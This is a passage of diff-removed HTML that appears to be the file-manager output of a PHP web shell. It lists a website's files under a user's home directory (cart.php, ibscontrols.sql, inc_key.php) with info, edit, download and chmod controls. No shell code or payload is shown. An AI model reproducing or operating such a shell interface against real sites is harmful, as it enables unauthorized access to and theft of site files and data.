-<td><a href="#" onclick="document.todo.act.value='f';document.todo.f.value='application.php';document.todo.ft.value='info';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.submit();">I</a>&nbsp;<a href="#" onclick="document.todo.act.value='f';document.todo.f.value='application.php';document.todo.ft.value='edit';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.submit();">E</a>&nbsp;<a href="#" onclick="document.todo.act.value='f';document.todo.f.value='application.php';document.todo.ft.value='download';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.submit();">D</a>&nbsp;<input type="checkbox" name="actbox[]" id="actbox17" value="/home/andrew/work/ibscontrols/ibs-controls.com/application.php"></td>
-</tr>
-<tr>
-<td>&nbsp;<a href="#" onclick="document.todo.act.value='f';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.f.value='bgcolor.gif';document.todo.submit();">bgcolor.gif</a></td>
-<td>283 B</td>
-<td>20.07.2008 15:22:04</td>
-<td>andrew/andrew</td>
-<td>&nbsp;<a href="#" onclick="document.todo.act.value='chmod';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.f.value='bgcolor.gif';document.todo.submit();"><b><font color=green>-rw-r--r--</font></b></a></td>
-<td><a href="#" onclick="document.todo.act.value='f';document.todo.f.value='bgcolor.gif';document.todo.ft.value='info';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.submit();">I</a>&nbsp;<a href="#" onclick="document.todo.act.value='f';document.todo.f.value='bgcolor.gif';document.todo.ft.value='edit';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.submit();">E</a>&nbsp;<a href="#" onclick="document.todo.act.value='f';document.todo.f.value='bgcolor.gif';document.todo.ft.value='download';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.submit();">D</a>&nbsp;<input type="checkbox" name="actbox[]" id="actbox18" value="/home/andrew/work/ibscontrols/ibs-controls.com/bgcolor.gif"></td>
-</tr>
-<tr>
-<td>&nbsp;<a href="#" onclick="document.todo.act.value='f';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.f.value='cart.php';document.todo.submit();">cart.php</a></td>
-<td>1.91 KB</td>
-<td>10.11.2014 17:43:52</td>
-<td>andrew/andrew</td>
-<td>&nbsp;<a href="#" onclick="document.todo.act.value='chmod';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.f.value='cart.php';document.todo.submit();"><b><font color=green>-rw-r--r--</font></b></a></td>
-<td><a href="#" onclick="document.todo.act.value='f';document.todo.f.value='cart.php';document.todo.ft.value='info';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.submit();">I</a>&nbsp;<a href="#" onclick="document.todo.act.value='f';document.todo.f.value='cart.php';document.todo.ft.value='edit';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.submit();">E</a>&nbsp;<a href="#" onclick="document.todo.act.value='f';document.todo.f.value='cart.php';document.todo.ft.value='download';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.submit();">D</a>&nbsp;<input type="checkbox" name="actbox[]" id="actbox19" value="/home/andrew/work/ibscontrols/ibs-controls.com/cart.php"></td>
-</tr>
-<tr>
-<td>&nbsp;<a href="#" onclick="document.todo.act.value='f';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.f.value='company.php';document.todo.submit();">company.php</a></td>
-<td>995 B</td>
-<td>21.05.2008 21:19:11</td>
-<td>andrew/andrew</td>
-<td>&nbsp;<a href="#" onclick="document.todo.act.value='chmod';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.f.value='company.php';document.todo.submit();"><b><font color=green>-rw-r--r--</font></b></a></td>
-<td><a href="#" onclick="document.todo.act.value='f';document.todo.f.value='company.php';document.todo.ft.value='info';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.submit();">I</a>&nbsp;<a href="#" onclick="document.todo.act.value='f';document.todo.f.value='company.php';document.todo.ft.value='edit';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.submit();">E</a>&nbsp;<a href="#" onclick="document.todo.act.value='f';document.todo.f.value='company.php';document.todo.ft.value='download';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.submit();">D</a>&nbsp;<input type="checkbox" name="actbox[]" id="actbox20" value="/home/andrew/work/ibscontrols/ibs-controls.com/company.php"></td>
-</tr>
-<tr>
-<td>&nbsp;<a href="#" onclick="document.todo.act.value='f';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.f.value='construct.php';document.todo.submit();">construct.php</a></td>
-<td>377 B</td>
-<td>21.05.2008 21:19:11</td>
-<td>andrew/andrew</td>
-<td>&nbsp;<a href="#" onclick="document.todo.act.value='chmod';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.f.value='construct.php';document.todo.submit();"><b><font color=green>-rw-r--r--</font></b></a></td>
-<td><a href="#" onclick="document.todo.act.value='f';document.todo.f.value='construct.php';document.todo.ft.value='info';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.submit();">I</a>&nbsp;<a href="#" onclick="document.todo.act.value='f';document.todo.f.value='construct.php';document.todo.ft.value='edit';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.submit();">E</a>&nbsp;<a href="#" onclick="document.todo.act.value='f';document.todo.f.value='construct.php';document.todo.ft.value='download';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.submit();">D</a>&nbsp;<input type="checkbox" name="actbox[]" id="actbox21" value="/home/andrew/work/ibscontrols/ibs-controls.com/construct.php"></td>
-</tr>
-<tr>
-<td>&nbsp;<a href="#" onclick="document.todo.act.value='f';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.f.value='contact.php';document.todo.submit();">contact.php</a></td>
-<td>3.12 KB</td>
-<td>21.05.2008 21:19:12</td>
-<td>andrew/andrew</td>
-<td>&nbsp;<a href="#" onclick="document.todo.act.value='chmod';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.f.value='contact.php';document.todo.submit();"><b><font color=green>-rw-r--r--</font></b></a></td>
-<td><a href="#" onclick="document.todo.act.value='f';document.todo.f.value='contact.php';document.todo.ft.value='info';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.submit();">I</a>&nbsp;<a href="#" onclick="document.todo.act.value='f';document.todo.f.value='contact.php';document.todo.ft.value='edit';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.submit();">E</a>&nbsp;<a href="#" onclick="document.todo.act.value='f';document.todo.f.value='contact.php';document.todo.ft.value='download';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.submit();">D</a>&nbsp;<input type="checkbox" name="actbox[]" id="actbox22" value="/home/andrew/work/ibscontrols/ibs-controls.com/contact.php"></td>
-</tr>
-<tr>
-<td>&nbsp;<a href="#" onclick="document.todo.act.value='f';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.f.value='create.php';document.todo.submit();">create.php</a></td>
-<td>266 B</td>
-<td>21.05.2008 21:19:11</td>
-<td>andrew/andrew</td>
-<td>&nbsp;<a href="#" onclick="document.todo.act.value='chmod';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.f.value='create.php';document.todo.submit();"><b><font color=green>-rw-r--r--</font></b></a></td>
-<td><a href="#" onclick="document.todo.act.value='f';document.todo.f.value='create.php';document.todo.ft.value='info';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.submit();">I</a>&nbsp;<a href="#" onclick="document.todo.act.value='f';document.todo.f.value='create.php';document.todo.ft.value='edit';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.submit();">E</a>&nbsp;<a href="#" onclick="document.todo.act.value='f';document.todo.f.value='create.php';document.todo.ft.value='download';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.submit();">D</a>&nbsp;<input type="checkbox" name="actbox[]" id="actbox23" value="/home/andrew/work/ibscontrols/ibs-controls.com/create.php"></td>
-</tr>
-<tr>
-<td>&nbsp;<a href="#" onclick="document.todo.act.value='f';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.f.value='date.php';document.todo.submit();">date.php</a></td>
-<td>627 B</td>
-<td>21.05.2008 21:19:12</td>
-<td>andrew/andrew</td>
-<td>&nbsp;<a href="#" onclick="document.todo.act.value='chmod';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.f.value='date.php';document.todo.submit();"><b><font color=green>-rw-r--r--</font></b></a></td>
-<td><a href="#" onclick="document.todo.act.value='f';document.todo.f.value='date.php';document.todo.ft.value='info';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.submit();">I</a>&nbsp;<a href="#" onclick="document.todo.act.value='f';document.todo.f.value='date.php';document.todo.ft.value='edit';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.submit();">E</a>&nbsp;<a href="#" onclick="document.todo.act.value='f';document.todo.f.value='date.php';document.todo.ft.value='download';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.submit();">D</a>&nbsp;<input type="checkbox" name="actbox[]" id="actbox24" value="/home/andrew/work/ibscontrols/ibs-controls.com/date.php"></td>
-</tr>
-<tr>
-<td>&nbsp;<a href="#" onclick="document.todo.act.value='f';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.f.value='downloads.php';document.todo.submit();">downloads.php</a></td>
-<td>343 B</td>
-<td>12.10.2008 08:55:31</td>
-<td>andrew/andrew</td>
-<td>&nbsp;<a href="#" onclick="document.todo.act.value='chmod';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.f.value='downloads.php';document.todo.submit();"><b><font color=green>-rw-r--r--</font></b></a></td>
-<td><a href="#" onclick="document.todo.act.value='f';document.todo.f.value='downloads.php';document.todo.ft.value='info';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.submit();">I</a>&nbsp;<a href="#" onclick="document.todo.act.value='f';document.todo.f.value='downloads.php';document.todo.ft.value='edit';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.submit();">E</a>&nbsp;<a href="#" onclick="document.todo.act.value='f';document.todo.f.value='downloads.php';document.todo.ft.value='download';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.submit();">D</a>&nbsp;<input type="checkbox" name="actbox[]" id="actbox25" value="/home/andrew/work/ibscontrols/ibs-controls.com/downloads.php"></td>
-</tr>
-<tr>
-<td>&nbsp;<a href="#" onclick="document.todo.act.value='f';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.f.value='function.php';document.todo.submit();">function.php</a></td>
-<td>1.86 KB</td>
-<td>21.05.2008 21:19:11</td>
-<td>andrew/andrew</td>
-<td>&nbsp;<a href="#" onclick="document.todo.act.value='chmod';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.f.value='function.php';document.todo.submit();"><b><font color=green>-rw-r--r--</font></b></a></td>
-<td><a href="#" onclick="document.todo.act.value='f';document.todo.f.value='function.php';document.todo.ft.value='info';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.submit();">I</a>&nbsp;<a href="#" onclick="document.todo.act.value='f';document.todo.f.value='function.php';document.todo.ft.value='edit';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.submit();">E</a>&nbsp;<a href="#" onclick="document.todo.act.value='f';document.todo.f.value='function.php';document.todo.ft.value='download';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.submit();">D</a>&nbsp;<input type="checkbox" name="actbox[]" id="actbox26" value="/home/andrew/work/ibscontrols/ibs-controls.com/function.php"></td>
-</tr>
-<tr>
-<td>&nbsp;<a href="#" onclick="document.todo.act.value='f';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.f.value='ibscontrols.komodoproject';document.todo.submit();">ibscontrols.komodoproject</a></td>
-<td>194 B</td>
-<td>15.08.2014 15:57:23</td>
-<td>andrew/andrew</td>
-<td>&nbsp;<a href="#" onclick="document.todo.act.value='chmod';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.f.value='ibscontrols.komodoproject';document.todo.submit();"><b><font color=green>-rw-rw-r--</font></b></a></td>
-<td><a href="#" onclick="document.todo.act.value='f';document.todo.f.value='ibscontrols.komodoproject';document.todo.ft.value='info';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.submit();">I</a>&nbsp;<a href="#" onclick="document.todo.act.value='f';document.todo.f.value='ibscontrols.komodoproject';document.todo.ft.value='edit';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.submit();">E</a>&nbsp;<a href="#" onclick="document.todo.act.value='f';document.todo.f.value='ibscontrols.komodoproject';document.todo.ft.value='download';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.submit();">D</a>&nbsp;<input type="checkbox" name="actbox[]" id="actbox27" value="/home/andrew/work/ibscontrols/ibs-controls.com/ibscontrols.komodoproject"></td>
-</tr>
-<tr>
-<td>&nbsp;<a href="#" onclick="document.todo.act.value='f';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.f.value='ibscontrols.sql';document.todo.submit();">ibscontrols.sql</a></td>
-<td>64.8 KB</td>
-<td>21.05.2008 21:32:40</td>
-<td>andrew/andrew</td>
-<td>&nbsp;<a href="#" onclick="document.todo.act.value='chmod';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.f.value='ibscontrols.sql';document.todo.submit();"><b><font color=green>-rw-r--r--</font></b></a></td>
-<td><a href="#" onclick="document.todo.act.value='f';document.todo.f.value='ibscontrols.sql';document.todo.ft.value='info';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.submit();">I</a>&nbsp;<a href="#" onclick="document.todo.act.value='f';document.todo.f.value='ibscontrols.sql';document.todo.ft.value='edit';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.submit();">E</a>&nbsp;<a href="#" onclick="document.todo.act.value='f';document.todo.f.value='ibscontrols.sql';document.todo.ft.value='download';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.submit();">D</a>&nbsp;<input type="checkbox" name="actbox[]" id="actbox28" value="/home/andrew/work/ibscontrols/ibs-controls.com/ibscontrols.sql"></td>
-</tr>
-<tr>
-<td>&nbsp;<a href="#" onclick="document.todo.act.value='f';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.f.value='inc_desc.php';document.todo.submit();">inc_desc.php</a></td>
-<td>204 B</td>
-<td>21.05.2008 21:19:11</td>
-<td>andrew/andrew</td>
-<td>&nbsp;<a href="#" onclick="document.todo.act.value='chmod';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.f.value='inc_desc.php';document.todo.submit();"><b><font color=green>-rw-r--r--</font></b></a></td>
-<td><a href="#" onclick="document.todo.act.value='f';document.todo.f.value='inc_desc.php';document.todo.ft.value='info';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.submit();">I</a>&nbsp;<a href="#" onclick="document.todo.act.value='f';document.todo.f.value='inc_desc.php';document.todo.ft.value='edit';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.submit();">E</a>&nbsp;<a href="#" onclick="document.todo.act.value='f';document.todo.f.value='inc_desc.php';document.todo.ft.value='download';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.submit();">D</a>&nbsp;<input type="checkbox" name="actbox[]" id="actbox29" value="/home/andrew/work/ibscontrols/ibs-controls.com/inc_desc.php"></td>
-</tr>
-<tr>
-<td>&nbsp;<a href="#" onclick="document.todo.act.value='f';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.f.value='inc_footer.php';document.todo.submit();">inc_footer.php</a></td>
-<td>1.41 KB</td>
-<td>21.08.2014 13:21:20</td>
-<td>andrew/andrew</td>
-<td>&nbsp;<a href="#" onclick="document.todo.act.value='chmod';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.f.value='inc_footer.php';document.todo.submit();"><b><font color=green>-rw-r--r--</font></b></a></td>
-<td><a href="#" onclick="document.todo.act.value='f';document.todo.f.value='inc_footer.php';document.todo.ft.value='info';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.submit();">I</a>&nbsp;<a href="#" onclick="document.todo.act.value='f';document.todo.f.value='inc_footer.php';document.todo.ft.value='edit';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.submit();">E</a>&nbsp;<a href="#" onclick="document.todo.act.value='f';document.todo.f.value='inc_footer.php';document.todo.ft.value='download';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.submit();">D</a>&nbsp;<input type="checkbox" name="actbox[]" id="actbox30" value="/home/andrew/work/ibscontrols/ibs-controls.com/inc_footer.php"></td>
-</tr>
-<tr>
-<td>&nbsp;<a href="#" onclick="document.todo.act.value='f';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.f.value='inc_header.php';document.todo.submit();">inc_header.php</a></td>
-<td>4.47 KB</td>
-<td>20.08.2014 11:40:57</td>
-<td>andrew/andrew</td>
-<td>&nbsp;<a href="#" onclick="document.todo.act.value='chmod';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.f.value='inc_header.php';document.todo.submit();"><b><font color=green>-rw-r--r--</font></b></a></td>
-<td><a href="#" onclick="document.todo.act.value='f';document.todo.f.value='inc_header.php';document.todo.ft.value='info';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.submit();">I</a>&nbsp;<a href="#" onclick="document.todo.act.value='f';document.todo.f.value='inc_header.php';document.todo.ft.value='edit';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.submit();">E</a>&nbsp;<a href="#" onclick="document.todo.act.value='f';document.todo.f.value='inc_header.php';document.todo.ft.value='download';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.submit();">D</a>&nbsp;<input type="checkbox" name="actbox[]" id="actbox31" value="/home/andrew/work/ibscontrols/ibs-controls.com/inc_header.php"></td>
-</tr>
-<tr>
-<td>&nbsp;<a href="#" onclick="document.todo.act.value='f';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.f.value='inc_key.php';document.todo.submit();">inc_key.php</a></td>
-<td>112 B</td>
-<td>21.05.2008 21:19:12</td>
-<td>andrew/andrew</td>
-<td>&nbsp;<a href="#" onclick="document.todo.act.value='chmod';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.f.value='inc_key.php';document.todo.submit();"><b><font color=green>-rw-r--r--</font></b></a></td>
-<td><a href="#" onclick="document.todo.act.value='f';document.todo.f.value='inc_key.php';document.todo.ft.value='info';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.submit();">I</a>&nbsp;<a href="#" onclick="document.todo.act.value='f';document.todo.f.value='inc_key.php';document.todo.ft.value='edit';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.submit();">E</a>&nbsp;<a href="#" onclick="document.todo.act.value='f';document.todo.f.value='inc_key.php';document.todo.ft.value='download';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.submit();">D</a>&nbsp;<input type="checkbox" name="actbox[]" id="actbox32" value="/home/andrew/work/ibscontrols/ibs-controls.com/inc_key.php"></td>
-</tr>
-<tr>
-<td>&nbsp;<a href="#" onclick="document.todo.act.value='f';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.f.value='inc_popup_footer.php';document.todo.submit();">inc_popup_footer.php</a></td>
-<td>144 B</td>
-<td>21.05.2008 21:19:11</td>
-<td>andrew/andrew</td>
-<td>&nbsp;<a href="#" onclick="document.todo.act.value='chmod';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.f.value='inc_popup_footer.php';document.todo.submit();"><b><font color=green>-rw-r--r--</font></b></a></td>
-<td><a href="#" onclick="document.todo.act.value='f';document.todo.f.value='inc_popup_footer.php';document.todo.ft.value='info';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.submit();">I</a>&nbsp;<a href="#" onclick="document.todo.act.value='f';document.todo.f.value='inc_popup_footer.php';document.todo.ft.value='edit';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.submit();">E</a>&nbsp;<a href="#" onclick="document.todo.act.value='f';document.todo.f.value='inc_popup_footer.php';document.todo.ft.value='download';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.submit();">D</a>&nbsp;<input type="checkbox" name="actbox[]" id="actbox33" value="/home/andrew/work/ibscontrols/ibs-controls.com/inc_popup_footer.php"></td>
-</tr>
-<tr>
-<td>&nbsp;<a href="#" onclick="document.todo.act.value='f';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.f.value='inc_popup_header.php';document.todo.submit();">inc_popup_header.php</a></td>
-<td>696 B</td>
-<td>21.05.2008 21:19:12</td>
-<td>andrew/andrew</td>
-<td>&nbsp;<a href="#" onclick="document.todo.act.value='chmod';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.f.value='inc_popup_header.php';document.todo.submit();"><b><font color=green>-rw-r--r--</font></b></a></td>
-<td><a href="#" onclick="document.todo.act.value='f';document.todo.f.value='inc_popup_header.php';document.todo.ft.value='info';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.submit();">I</a>&nbsp;<a href="#" onclick="document.todo.act.value='f';document.todo.f.value='inc_popup_header.php';document.todo.ft.value='edit';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.submit();">E</a>&nbsp;<a href="#" onclick="document.todo.act.value='f';document.todo.f.value='inc_popup_header.php';document.todo.ft.value='download';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.submit();">D</a>&nbsp;<input type="checkbox" name="actbox[]" id="actbox34" value="/home/andrew/work/ibscontrols/ibs-controls.com/inc_popup_header.php"></td>
-</tr>
-<tr>
-<td>&nbsp;<a href="#" onclick="document.todo.act.value='f';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.f.value='index.php';document.todo.submit();">index.php</a></td>
-<td>1.27 KB</td>
-<td>18.08.2014 13:35:24</td>
-<td>andrew/andrew</td>
-<td>&nbsp;<a href="#" onclick="document.todo.act.value='chmod';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.f.value='index.php';document.todo.submit();"><b><font color=green>-rw-r--r--</font></b></a></td>
-<td><a href="#" onclick="document.todo.act.value='f';document.todo.f.value='index.php';document.todo.ft.value='info';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.submit();">I</a>&nbsp;<a href="#" onclick="document.todo.act.value='f';document.todo.f.value='index.php';document.todo.ft.value='edit';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.submit();">E</a>&nbsp;<a href="#" onclick="document.todo.act.value='f';document.todo.f.value='index.php';document.todo.ft.value='download';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.submit();">D</a>&nbsp;<input type="checkbox" name="actbox[]" id="actbox35" value="/home/andrew/work/ibscontrols/ibs-controls.com/index.php"></td>
-</tr>
-<tr>
-<td>&nbsp;<a href="#" onclick="document.todo.act.value='f';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.f.value='info.php';document.todo.submit();">info.php</a></td>
-<td>16 B</td>
-<td>21.05.2008 21:19:12</td>
-<td>andrew/andrew</td>
-<td>&nbsp;<a href="#" onclick="document.todo.act.value='chmod';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.f.value='info.php';document.todo.submit();"><b><font color=green>-rw-r--r--</font></b></a></td>
-<td><a href="#" onclick="document.todo.act.value='f';document.todo.f.value='info.php';document.todo.ft.value='info';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.submit();">I</a>&nbsp;<a href="#" onclick="document.todo.act.value='f';document.todo.f.value='info.php';document.todo.ft.value='edit';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.submit();">E</a>&nbsp;<a href="#" onclick="document.todo.act.value='f';document.todo.f.value='info.php';document.todo.ft.value='download';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.submit();">D</a>&nbsp;<input type="checkbox" name="actbox[]" id="actbox36" value="/home/andrew/work/ibscontrols/ibs-controls.com/info.php"></td>
-</tr>
-<tr>
-<td>&nbsp;<a href="#" onclick="document.todo.act.value='f';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.f.value='links.php';document.todo.submit();">links.php</a></td>
-<td>2.08 KB</td>
-<td>24.02.2009 20:40:37</td>
-<td>andrew/andrew</td>
-<td>&nbsp;<a href="#" onclick="document.todo.act.value='chmod';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.f.value='links.php';document.todo.submit();"><b><font color=green>-rw-r--r--</font></b></a></td>
-<td><a href="#" onclick="document.todo.act.value='f';document.todo.f.value='links.php';document.todo.ft.value='info';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.submit();">I</a>&nbsp;<a href="#" onclick="document.todo.act.value='f';document.todo.f.value='links.php';document.todo.ft.value='edit';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.submit();">E</a>&nbsp;<a href="#" onclick="document.todo.act.value='f';document.todo.f.value='links.php';document.todo.ft.value='download';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.submit();">D</a>&nbsp;<input type="checkbox" name="actbox[]" id="actbox37" value="/home/andrew/work/ibscontrols/ibs-controls.com/links.php"></td>
-</tr>
-<tr>
